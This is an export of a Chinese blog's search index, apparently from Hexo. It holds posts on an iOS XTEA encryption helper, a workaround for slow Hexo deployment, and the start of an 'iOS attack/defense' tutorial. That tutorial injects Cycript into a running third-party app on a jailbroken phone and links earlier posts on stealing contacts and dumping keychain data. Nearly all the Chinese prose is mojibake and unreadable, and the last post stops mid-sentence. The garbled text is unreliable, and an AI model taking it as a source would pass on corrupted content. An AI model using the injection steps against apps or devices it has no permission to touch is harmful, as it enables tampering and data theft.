    <content type="text"><![CDATA[è®¸å¤šå¹´åŽæœ‰ä¸€è‚¡å¯’é£Žï¼Œä»Žæˆ‘è‡ªä»¥ä¸ºç«çƒ­æ¸©æš–çš„ä»Žæœªè¢«å¯’å†·ä¾µå…¥çš„å†…å¿ƒæ·±å¤„é˜µé˜µè¢­æ¥æ—¶ï¼Œæˆ‘æ‰å‘çŽ°ç©¿å†åŽšçš„æ£‰è¡£ä¹Ÿæ²¡ç”¨äº†ã€‚ç”Ÿå‘½æœ¬èº«æœ‰ä¸€ä¸ªå†¬å¤©ï¼Œå®ƒå·²ç»æ¥ä¸´ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šå¯’é£Žå¹å½»ã€‹ ç®€ä»‹ åœ¨å¯†ç å­¦ä¸­ï¼Œå¾®åž‹åŠ å¯†ç®—æ³•ï¼ˆTiny Encryption Algorithmï¼ŒTEAï¼‰æ˜¯ä¸€ç§æ˜“äºŽæè¿°å’Œæ‰§è¡Œçš„å—å¯†ç ï¼Œé€šå¸¸åªéœ€è¦å¾ˆå°‘çš„ä»£ç å°±å¯å®žçŽ°ã€‚å…¶è®¾è®¡è€…æ˜¯å‰‘æ¡¥å¤§å­¦è®¡ç®—æœºå®žéªŒå®¤çš„å¤§å«Â·æƒ å‹’ä¸Žç½—æ°Â·å°¼è¾¾å§†ã€‚è¿™é¡¹æŠ€æœ¯æœ€åˆäºŽ1994å¹´æäº¤ç»™é²æ±¶çš„å¿«é€Ÿè½¯ä»¶åŠ å¯†çš„ç ”è®¨ä¼šä¸Šï¼Œå¹¶åœ¨è¯¥ç ”è®¨ä¼šä¸Šæ¼”è®²ä¸­é¦–æ¬¡å‘è¡¨ã€‚ åœ¨ç»™å‡ºçš„ä»£ç ä¸­ï¼šåŠ å¯†ä½¿ç”¨çš„æ•°æ®ä¸º2ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¯†é’¥ä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°å³å¯†é’¥é•¿åº¦ä¸º128ä½ æ­£æ–‡å…³äºŽåŠ å¯†ç®—æ³• åŠ å¯†ç®—æ³•è™½ç„¶æˆ‘ä»¬å¯èƒ½ä¸æ˜¯éžå¸¸äº†è§£åº•å±‚åŽŸç†ï¼Œä½†æ˜¯åœ¨çŽ°åœ¨ä¿¡æ¯å®‰å…¨çš„å¹´ä»£ï¼Œå·¥ä½œä¸­ä¹Ÿä¼šç»å¸¸éœ€è¦ç”¨çš„ï¼Œæ¯”å¦‚ï¼š éžå¯¹ç§°åŠ å¯†çš„ï¼šRSAã€ECCï¼ˆç§»åŠ¨è®¾å¤‡ç”¨ï¼‰ã€DSAï¼ˆæ•°å­—ç­¾åç”¨ï¼‰ å¯¹ç§°åŠ å¯†çš„ï¼šAESï¼ŒDES Hashç®—æ³•çš„ï¼šMD2ã€MD4ã€MD5ã€HAVALã€SHAã€SHA-1ã€HMACã€HMAC-MD5ã€HMAC-SHA1 æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°è¿™ç§æƒ…å†µï¼šå› ä¸ºæ•°æ®é•¿åº¦æœ‰é™åˆ¶ï¼Œéœ€è¦åŠ å¯†åŽçš„æ•°æ®é•¿åº¦å°½å¯èƒ½çš„çŸ­ã€‚æ¯”å¦‚å¦‚æžœç»™è“ç‰™çš„å¹¿æ’­æ•°æ®åŠ ä¸€æ¬¡å¯†åšå•å‘çš„æ ¡éªŒã€‚ä½†æ˜¯åœ¨iOSå¼€å‘ä¸­ï¼Œè‡ªå®šä¹‰å¹¿æ’­çš„æ•°æ®é•¿åº¦æ˜¯æœ‰é™çš„ï¼Œæ€»å…±å¯ç”¨çš„æ‰31ä¸ªå­—èŠ‚ï¼Œå†é™¤åŽ»è“ç‰™å­—æ®µåç§°ã€é•¿åº¦ã€è“ç‰™åç§°çš„å®žé™…å€¼ã€è‡ªå®šä¹‰å­—æ®µåç§°åŠé•¿åº¦ç­‰ç­‰ï¼Œå®žé™…ä¸Šå¯ä»¥ç»™æˆ‘ä»¬è‡ªå®šä¹‰ä½¿ç”¨çš„éƒ¨åˆ†é‚£çœŸçš„æ˜¯å°‘çš„å¯æ€œã€‚ ä½†æ˜¯åˆä¸èƒ½å°†å…¨éƒ¨çš„å¹¿æ’­åŒ…æ•°æ®éƒ½åŠ å¯†ï¼Œå› ä¸ºè‹¹æžœä¼šå…ˆå°†å¹¿æ’­æ•°æ®æŒ‰ç…§åè®®è§£æžå®Œæˆä¹‹åŽï¼Œå°†é‡Œé¢çš„å°‘éƒ¨åˆ†æ•°æ®å°è£…æˆå¯¹è±¡æŠ›ç»™ä¸Šå±‚ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œå¦‚æžœæ•´ä¸ªå¹¿æ’­åŒ…åŠ å¯†ä¼šå¯¼è‡´æˆ‘ä»¬æ— æ³•èŽ·å–åˆ°å¹¿æ’­æ•°æ®ï¼Œæ‰€ä»¥å°±åªèƒ½å•ç‹¬çš„åŠ å¯†è‡ªå®šä¹‰å¹¿æ’­éƒ¨åˆ†çš„æ•°æ®ã€‚ åœ¨è¿™é‡Œå°±ä¸èƒ½ä½¿ç”¨RSAäº†ï¼Œå› ä¸ºæ€§èƒ½æ¯”è¾ƒä½Žã€åŠ è§£å¯†æ¯”è¾ƒæ…¢ï¼›AESè¿™æ ·çš„ç®—æ³•åˆå¯¹æ•°æ®é•¿åº¦æœ‰è¦æ±‚ï¼Œæœ€ä½Žéƒ½éœ€è¦16ä¸ªå­—èŠ‚ï¼›Hashç®—æ³•åˆä¸å¯é€†ï¼Œæ— æ³•èŽ·å–åŽŸå§‹æ•°æ®ã€‚æœ€ç»ˆåœ¨æŠ€æœ¯ç»ç†çš„æè®®ä¸‹ï¼Œä½¿ç”¨äº†ä¸€ç§å«XTEAçš„ç®—æ³•ï¼ŒXTEAæ˜¯TEAçš„å‡çº§ç‰ˆï¼Œå¢žåŠ äº†æ›´å¤šçš„å¯†é’¥è¡¨ï¼Œç§»ä½å’Œå¼‚æˆ–æ“ä½œç­‰ç­‰ã€‚ XTEAåŠ å¯†è¿‡ç¨‹ iOSä½¿ç”¨ ç®—æ³•å®žçŽ°æºç æ˜¯ä½¿ç”¨Cè¯­è¨€å†™çš„ï¼Œè™½ç„¶iOSå¯ä»¥ç›´æŽ¥è°ƒç”¨Cå‡½æ•°ï¼Œä½†æ˜¯ç›´æŽ¥è°ƒç”¨æ€»æ„Ÿè§‰å¾ˆåˆ«æ‰­ï¼Œæ‰€ä»¥å°±å°†è¯¥ç®—æ³•ç›´æŽ¥ä»¥åˆ†ç±»çš„æ–¹å¼ç®€å•å°è£…ä¸€ä¸‹ï¼Œéœ€è¦ç”¨åˆ°çš„å°ä¼™ä¼´å¯ä»¥ç›´æŽ¥ä½¿ç”¨ï¼Œå› ä¸ºä¸€å…±å°±æ²¡å¤šå°‘è¡Œä»£ç ï¼Œç›´æŽ¥è´´ä»£ç äº†ï¼š ç›´æŽ¥ç»™NSDataæ·»åŠ ä¸€ä¸ªXTEAç®—æ³•çš„åˆ†ç±»ï¼Œ.hæ–‡ä»¶å¦‚ä¸‹ï¼š 12345678910111213141516171819/** åŠ å¯†æ•°æ® @param data éœ€è¦åŠ å¯†çš„æ•°æ® (8å­—èŠ‚) @param keyData åŠ å¯†çš„Key (16å­—èŠ‚) @param rounds å¾ªçŽ¯æ¬¡æ•° @return åŠ å¯†è¿‡çš„æ•°æ® (8å­—èŠ‚) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds;/** è§£å¯†æ•°æ® @param data éœ€è¦è§£å¯†çš„æ•°æ® (8å­—èŠ‚) @param keyData è§£å¯†çš„key (16å­—èŠ‚) @param rounds å¾ªçŽ¯æ¬¡æ•° @return è§£å¯†è¿‡çš„æ•°æ® (8å­—èŠ‚) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds; .mæ–‡ä»¶å¦‚ä¸‹ï¼š æ³¨æ„å¼•å…¥éœ€è¦çš„å¤´æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// å¼•å…¥å¿…è¦çš„å¤´æ–‡ä»¶#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;// å£°æ˜Žå¸¸é‡static NSInteger const kUint32DataCount = 2;static NSInteger const kUint32KeyCount = 4;static NSInteger const kSubdataLength = 4;void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;/** åŠ å¯†æ•°æ® @param data éœ€è¦åŠ å¯†çš„æ•°æ® (8å­—èŠ‚) @param keyData åŠ å¯†çš„Key (16å­—èŠ‚) @param rounds å¾ªçŽ¯æ¬¡æ•° @return åŠ å¯†è¿‡çš„æ•°æ® (8å­—èŠ‚) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @"encryptData: (data length != 8)"); NSAssert(keyData.length == 16, @"encryptData: (keyData length != 16)"); // å°†æ•°æ®æ‹†åˆ†æˆ2ä¸ªuint32_tæ•°ç»„ uint32_t encryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; encryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // å°†Keyæ‹†æˆ4ä¸ªuint32_tæ•°ç»„ uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // åŠ å¯† encipher(rounds, encryptData, key); // è¿”å›žç»“æžœ return [NSData dataFromUInt32Array:encryptData length:data.length];&#125;/** è§£å¯†æ•°æ® @param data éœ€è¦è§£å¯†çš„æ•°æ® (8å­—èŠ‚) @param keyData è§£å¯†çš„key (16å­—èŠ‚) @param rounds å¾ªçŽ¯æ¬¡æ•° @return è§£å¯†è¿‡çš„æ•°æ® (8å­—èŠ‚) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @"decryptData: (data length != 8)"); NSAssert(keyData.length == 16, @"decryptData: (keyData length != 16)"); // å°†æ•°æ®æ‹†åˆ†æˆ2ä¸ªuint32_tæ•°ç»„ uint32_t decryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; decryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // å°†Keyæ‹†æˆ4ä¸ªuint32_tæ•°ç»„ uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // è§£å¯† decipher(rounds, decryptData, key); // è¿”å›žç»“æžœ return [NSData dataFromUInt32Array:decryptData length:data.length];&#125; ä½¿ç”¨åˆ°çš„æ•°æ®è½¬æ¢ NSData è½¬ uint32 uint32 è½¬ NSData 12345678910111213141516+ (uint32_t)uint32FromData:(NSData *)hexData&#123; NSAssert(hexData.length == 4, @"uint32FromData: (data length != 4)"); Byte dataBytes[4]; [hexData getBytes:&amp;dataBytes length:4]; uint32_t resultValue = *(uint32_t *)dataBytes ; return resultValue;&#125;+ (NSData *)dataFromUInt32Array:(uint32_t *)value length:(NSInteger)length&#123; Byte *result = (Byte *)value; return [NSData dataWithBytes:result length:length];&#125; å‚è€ƒ å¸¸ç”¨åŠ å¯†ç®—æ³•æ¦‚è¿° TEAã€XTEAã€XXTEAåŠ å¯†è§£å¯†ç®—æ³•]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>XTEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®°ä¸€æ¬¡Hexoåšå®¢éƒ¨ç½²ç¼“æ…¢çš„è§£å†³åŠžæ³•]]></title>
    <url>%2Farchives%2F8e3becb8.html</url>
    <content type="text"><![CDATA[å†µä¸”ï¼Œä¸€ä¸ªäººè¦æ´»çš„çœŸå®žå°±éš¾å…ä¸æŠŠåˆ«äººçš„ä¸€ç”Ÿå½“ä¸€åœºæˆã€‚çœ‹ä¸è§çš„å²æœˆæ˜¯å¯æ€•çš„ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šä¸€ä¸ªäººçš„æ‘åº„ã€‹ ç®€ä»‹ æœ¬æ¥ä¹‹å‰ä¹Ÿæœ‰æƒ³æŠŠåšå®¢çš„å›¾ç‰‡æ”¾åœ¨ä¸ƒç‰›çš„æœåŠ¡å™¨ä¸Šåšæˆå¤–é“¾çš„ï¼Œä½†æ˜¯åŽ»æ³¨å†Œå‘çŽ°éœ€è¦å®žåè®¤è¯ï¼Œæ‰€ä»¥å°±æ”¾å¼ƒæŠ˜è…¾äº†ï¼›è€Œä¸”æˆ‘çš„åšå®¢ç›®å‰æ¥è¯´è¿˜å¾ˆå°ï¼Œæ‰€ä»¥å›¾ç‰‡ä¹Ÿå°±ç›´æŽ¥åœ¨æœ¬åœ°åŽ‹ç¼©ä¸‹å°±ä½¿ç”¨äº†ã€‚ æœ€è¿‘ä¸€æ¬¡å†™åšå®¢ç”¨çš„å›¾ç‰‡æ¯”è¾ƒå¤šï¼Œç„¶åŽå½“æ—¶ä¹Ÿå¿˜è®°åŽ‹ç¼©äº†ï¼Œæ‰€ä»¥å°±å¯¼è‡´ä½¿ç”¨hexo dæäº¤éƒ¨ç½²çš„æ—¶å€™ä¸€ç›´ä¸è§æˆåŠŸï¼Œä¸­é—´æäº¤ã€ç­‰å¾…ã€å–æ¶ˆã€é‡è¯•ï¼Œæ¥æ¥å›žå›žæŠ˜è…¾å¥½å¤šæ¬¡ä¹Ÿæ²¡è§æˆåŠŸï¼Œä»¥ä¸ºæ˜¯è¿žæŽ¥GitHubæ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥æŒ‚æ¢¯å­ï¼Œä¾ç„¶å¦‚æ•…â€¦ æ€è€ƒ &amp; è§£å†³æ€è€ƒ æ—¢ç„¶ä½¿ç”¨terminaléƒ¨ç½²æ–‡ä»¶æ¯”è¾ƒå¤§æ—¶æ¯”è¾ƒæ…¢ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±éœ€è¦æ¢ä¸€ç§æ–¹æ³•åŽ»éƒ¨ç½²æ›´æ–°äº†ã€‚ æˆ‘ä»¬åœ¨ç¼–è¾‘å®Œæ–‡ç« ä½¿ç”¨hexo gç”Ÿæˆå‘½ä»¤çš„æ—¶å€™ï¼Œå®žé™…ä¸Šï¼Œæ˜¯å°†æˆ‘ä»¬çš„Markdownæ ¼å¼æ–‡ä»¶é‡æ–°ç”Ÿæˆå¯¹åº”çš„é™æ€HTMLç½‘é¡µæ ¼å¼çš„æ–‡ä»¶ï¼Œå¹¶ä¸”å’Œç›¸å…³çš„å›¾ç‰‡ç´ æä¸€èµ·æ”¾åœ¨åšå®¢çš„æ ¹ç›®å½•çš„publicç›®å½•ä¸‹ã€‚ åŒæ—¶publicç›®å½•ä¸‹ä¹Ÿä¼šç”Ÿæˆæˆ‘ä»¬çš„ç«™ç‚¹ä¸»é¢˜é…ç½®ã€æ ·å¼ã€SEOä¼˜åŒ–ã€ç«™ç‚¹åœ°å›¾ã€ç™¾åº¦èœ˜è››çˆ¬å–é…ç½®ç­‰ç­‰çš„æˆ‘ä»¬åœ¨ç½‘ç«™æ‰€èƒ½è®¿é—®åˆ°çš„ä»»ä½•æ–‡ä»¶å’Œèµ„æºã€‚ æˆ‘ä»¬åœ¨æ‰§è¡Œhexo cleanå‘½ä»¤æ—¶å€™ï¼Œå®žé™…ä¸Šæ¸…ç©ºçš„ä¹Ÿæ˜¯è¿™ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚ å½“æˆ‘ä»¬å¼€å§‹hexo dæäº¤éƒ¨ç½²çš„æ—¶å€™ï¼Œå®žé™…ä¸Šå°±æ˜¯æŠŠpublicç›®å½•ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶ä¸Šä¼ åˆ°GitHubæœåŠ¡å™¨ä¸Šé¢ï¼Œè¿™æ ·æˆ‘ä»¬çš„é™æ€ç½‘ç«™å°±å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬æ–°ç¼–è¾‘çš„å†…å®¹äº†ã€‚ è§£å†³ æ—¢ç„¶æˆ‘ä»¬çš„åšå®¢ç«™ç‚¹è®¿é—®çš„æ–‡ä»¶éƒ½æ˜¯å­˜æ”¾åœ¨GitHubä¸Šé¢çš„é™æ€æ–‡ä»¶ï¼Œè€Œè¿™äº›é™æ€æ–‡ä»¶åˆéƒ½æ˜¯åœ¨æœ¬åœ°æ¯æ¬¡ç”Ÿæˆåœ¨publicç›®å½•ä¸‹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨GitHub Desktopå®¢æˆ·ç«¯ï¼Œåƒæˆ‘ä»¬ç®¡ç†è‡ªå·±çš„GitHubä»“åº“ä¸€æ ·æ¥ç®¡ç†ç½‘ç«™çš„ä»“åº“äº†ã€‚ é¦–å…ˆä½¿ç”¨GitHub Desktopå®¢æˆ·ç«¯æˆ–è€…å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ï¼Œå°†ä½ ç½‘ç«™çš„ä»“åº“æ‹‰åˆ°æœ¬åœ°ï¼š å¯ä»¥å¯¹æ¯”ç½‘ç«™çš„ä»“åº“æ–‡ä»¶å’Œåšå®¢publicç›®å½•ä¸‹çš„æ–‡ä»¶æ˜¯ä¸€æ¯›ä¸€æ ·çš„ï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªç®¡ç†æ–‡ä»¶çš„.gitç›®å½•ã€‚ æ­¤æ—¶æˆ‘ä»¬å†éƒ¨ç½²ç½‘ç«™å°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ­¥éª¤å®Œæˆ: ä½¿ç”¨hexo gç”Ÿæˆåšå®¢çš„é™æ€æ–‡ä»¶ å°†publicç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æ‹·è´åˆ°æˆ‘ä»¬æ‹‰å–åˆ°æœ¬åœ°çš„åšå®¢ç«™ç‚¹æ–‡ä»¶å†…ï¼Œæ›¿æ¢åšå®¢ç«™ç‚¹ç›®å½•å†…æ‰€æœ‰æ–‡ä»¶ã€‚ ä½¿ç”¨GitHub Desktopæäº¤åšå®¢ç«™ç‚¹ç›®å½•å†…çš„å˜åŠ¨æ–‡ä»¶å³å¯ã€‚ è¿™é‡Œå¦‚æžœæƒ³å’Œåšå®¢çš„GitHubä»“åº“çš„æäº¤è®°å½•ä¿æŒä¸€è‡´ï¼šåªéœ€è¦å°†æäº¤çš„Commitä¿¡æ¯æŒ‰Site updated: 2018-08-30 17:17:25è¿™ä¸ªæ ¼å¼å†™å°±å¯ä»¥äº†ã€‚ åˆ·æ–°ç½‘é¡µå°±ä¼šå‘çŽ°å·²ç»éƒ¨ç½²æˆåŠŸï¼Œå¯ä»¥æ­£å¸¸è®¿é—®æ–°ç¼–è¾‘çš„å†…å®¹äº†ã€‚ æ€»ç»“ æœ¬æ–¹æ¡ˆå¯ä»¥ç”¨äºŽä¸´æ—¶éœ€è¦éƒ¨ç½²æ¯”è¾ƒå¤§çš„æ–‡ä»¶å¯¼è‡´æ¯”è¾ƒæ…¢çš„éƒ¨ç½²æƒ…å†µã€‚ å¦‚æžœå¯èƒ½ï¼Œè¿˜æ˜¯å°½é‡ä½¿ç”¨å›¾ç‰‡å¤–é“¾çš„æ–¹å¼ï¼Œåšå®¢çš„è®¿é—®é€Ÿåº¦å’Œä½“éªŒä¹Ÿä¼šæå‡ã€‚]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆå…­ï¼‰ï¼šä½¿ç”¨Cycriptä¸€çª¥è¿è¡Œç¨‹åºçš„ç¥žç§˜é¢çº±(å…¥é—¨ç¯‡)]]></title>
    <url>%2Farchives%2Fc12f47b1.html</url>
    <content type="text"><![CDATA[ä»Žé‚£ä¸ªå¤œæ™šæˆ‘æ‡‚å¾—äº†éšè—æ¸©æš–â€”â€”åœ¨å‡›å†½çš„å¯’é£Žä¸­ï¼Œèº«ä½“ä¸­é‚£ç‚¹æ¸©æš–èŠ‚ä¿­åœ°ç”¨äºŽæ­¤åŽå¤šå¹´çš„çˆ±æƒ…å’Œç”Ÿæ´»ã€‚æˆ‘çš„äº²äººè¯´æˆ‘æ˜¯ä¸ªå¾ˆå†·çš„äººï¼Œä¸æ˜¯çš„ï¼Œæˆ‘æŠŠä»…æœ‰çš„æ¸©æš–å…¨ç»™äº†ä½ ä»¬ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šå¯’é£Žå¹å½»ã€‹ ç®€ä»‹ Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion.(It also runs standalone on Android and Linux and provides access to Java, but without injection.) Cycriptæ˜¯ç”±Cydiaåˆ›å§‹äººSaurikæŽ¨å‡ºçš„ä¸€æ¬¾è„šæœ¬è¯­è¨€ï¼ŒCycript æ··åˆäº†Objective-Cä¸Žjavascriptè¯­æ³•çš„è§£é‡Šå™¨ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªå‘½ä»¤ä¸­ç”¨Objective-Cæˆ–è€…javascriptï¼Œç”šè‡³ä¸¤è€…å…¼ç”¨ã€‚ å®ƒèƒ½å¤Ÿæ³¨å…¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶ä¿®æ”¹åº”ç”¨çš„å¾ˆå¤šä¸œè¥¿ã€‚ cycriptå®˜ç½‘ äº†è§£æ›´å¤šï¼š iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± &amp; SSH iOSæ”»é˜²ï¼ˆäºŒï¼‰ï¼šçªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ &amp; å·çª¥ç”¨æˆ·å®‰è£…åº”ç”¨åˆ—è¡¨ &amp; Netcatä½¿ç”¨ iOSæ”»é˜²ï¼ˆä¸‰ï¼‰ï¼šé…ç½®ä½¿ç”¨Revealå·¥å…·é€†å‘åˆ«äººçš„App UIç•Œé¢ iOSæ”»é˜²ï¼ˆå››ï¼‰ï¼šä½¿ç”¨Dumpdecrypted ç ¸å£³ &amp; class-dump å¯¼å‡ºå¤´æ–‡ä»¶ iOSæ”»é˜²ï¼ˆäº”ï¼‰ï¼šä½¿ç”¨Keychain-Dumperå¯¼å‡ºkeychainæ•°æ® Cycriptå®‰è£… å®‰è£…Cycriptæœ‰ä¸¤ç§æ–¹å¼ï¼ˆæ‰‹æœºéœ€è¶Šç‹±ï¼‰ï¼š æ–¹å¼ä¸€ï¼šç›´æŽ¥åœ¨Cydiaæœç´¢Cycriptå®‰è£…ï¼Œç®€å•æ–¹ä¾¿ã€‚ æ–¹å¼äºŒï¼šé€šè¿‡LinuxåŒ…ç®¡ç†å™¨å®‰è£…ï¼š é¦–å…ˆåœ¨æ‰‹æœºä¸ŠCydiaæœç´¢å®‰è£… APT 0.6 TransitionalåŒ…ç®¡ç†å·¥å…·ã€‚ ä½¿ç”¨Terminalï¼ˆå¦‚æžœæ‰‹æœºæœ‰å®‰è£…ï¼‰æˆ–è€…ç”µè„‘SSHè¿žæŽ¥æ‰‹æœºï¼Œé€šè¿‡åŒ…ç®¡ç†å™¨å®‰è£…apt-get install cycriptã€‚ ç»ˆç«¯è¾“å…¥cycriptï¼Œå‡ºçŽ° cy#æç¤ºç¬¦ï¼Œè¯´æ˜Žå·²ç»æˆåŠŸå¯åŠ¨äº†Cycriptï¼ˆéœ€è¦SSHè¿žæŽ¥æ‰‹æœºï¼‰ã€‚ å¦‚æžœæƒ³è¦é€€å‡ºCycriptå’Œæ–­å¼€è¿œç¨‹ç™»å½•ï¼š Control + Då¿«æ·é”®å¯ä»¥é€€å‡ºCycript ç»ˆç«¯è¾“å…¥logoutå¯ä»¥æ–­å¼€æ‰‹æœºè¿œç¨‹ç™»å½• CycriptåŸºæœ¬ç”¨æ³•æµ‹è¯•Cycriptæ³¨å…¥å¤´æ¡æ–°é—» å¼€å§‹ä½¿ç”¨Cycriptï¼Œæ³¨å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œï¼ˆéœ€è¦å†å‰å°ï¼‰çš„ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬ä»¥ä»Šæ—¥å¤´æ¡ä¸ºä¾‹ã€‚ é¦–å…ˆä½¿ç”¨ç”µè„‘ç»ˆç«¯é€šè¿‡SSHè¿žæŽ¥åˆ°æ‰‹æœºï¼Œä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨SSHçš„è¯·å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ èŽ·å–ä»Šæ—¥å¤´æ¡appçš„è¿›ç¨‹IDï¼Œå»ºè®®æ¸…ç©ºåŽå°åº”ç”¨ï¼Œåªä¿ç•™éœ€è¦hookçš„Appåœ¨å‰å°å³å¯ã€‚ Newså³ä¸ºä»Šæ—¥å¤´æ¡è¿›ç¨‹åç§°ï¼Œå¦‚æžœæƒ³çŸ¥é“æŸä¸ªappåœ¨è¿è¡Œæ—¶å€™çš„è¿›ç¨‹åç§°ï¼Œå¯ä»¥ä¸‹è½½å¯¹åº”çš„åº”ç”¨å®‰è£…åŒ…ï¼Œè§£åŽ‹ç¼©æ‰¾åˆ°Payloadç›®å½•ä¸‹çš„xxx.appï¼Œå…¶ä¸­xxxåŒ…åå³æ˜¯è¿›ç¨‹åç§°ï¼Œå¦‚å¾®ä¿¡æ˜¯WeChatï¼Œç½‘æ˜“äº‘éŸ³ä¹æ˜¯NeteaseMusicã€‚ åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸­æŸ¥æ‰¾è¿‡æ»¤æˆ‘ä»¬éœ€è¦çš„è¿›ç¨‹åç§°ï¼Œå‘½åå¦‚ä¸‹ï¼š 1ps -e | grep News æˆåŠŸä¹‹åŽï¼Œå°±å¯ä»¥çœ‹åˆ°ä»Šæ—¥å¤´æ¡åº”ç”¨è¿›ç¨‹çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ID9347ï¼Œè¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ç­‰å¾…ã€‚ æ‹¿åˆ°è¿›ç¨‹IDåŽï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³¨å…¥ä½è¿™ä¸ªè¿›ç¨‹ï¼Œä»Žè€Œå¯¹åº”ç”¨ä¸ºæ‰€æ¬²ä¸ºäº†ðŸ˜ˆï¼Œå¦‚ä½•æ³¨å…¥è¿›ç¨‹ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 12cycript -p 9347 // éœ€è¦hookçš„ç¨‹åºæ‰“å¼€åˆ°å‰å°// cycript -p News æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æµ‹ä¸‹ä¸‹æ˜¯å¦hookæˆåŠŸï¼š 12[[UIApplication sharedApplication] setStatusBarHidden:YES] // éšè—çŠ¶æ€æ [[UIApplication sharedApplication] setStatusBarHidden:NO] // æ˜¾ç¤ºçŠ¶æ€æ  å¸¸ç”¨æ•°æ®ç±»åž‹åŠç±»åž‹åˆ¤æ–­ å¸¸ç”¨çš„æ•°æ®ç±»åž‹ï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„ã€å­—å…¸ã€Boolï¼Œ NSNumberï¼‰å’Œæˆ‘ä»¬åœ¨OCä¸­ä½¿ç”¨çš„å®Œå…¨ä¸€æ ·ã€‚ ç±»åž‹åˆ¤æ–­ä½¿ç”¨instanceofï¼Œå¦‚ï¼š 123456cy# @"Hello World" instanceof Stringtruecy# @[1, 2, 3] instanceof Arraytruecy# @"Hello World" instanceof Arrayfalse å­—ç¬¦ä¸²åŠæ•°ç»„æˆªå– å­—ç¬¦ä¸²åŠæ•°ç»„æˆªå–æ“ä½œï¼Œåˆ†åˆ«ä½¿ç”¨substrå’Œsliceã€‚ ä¸‹æ 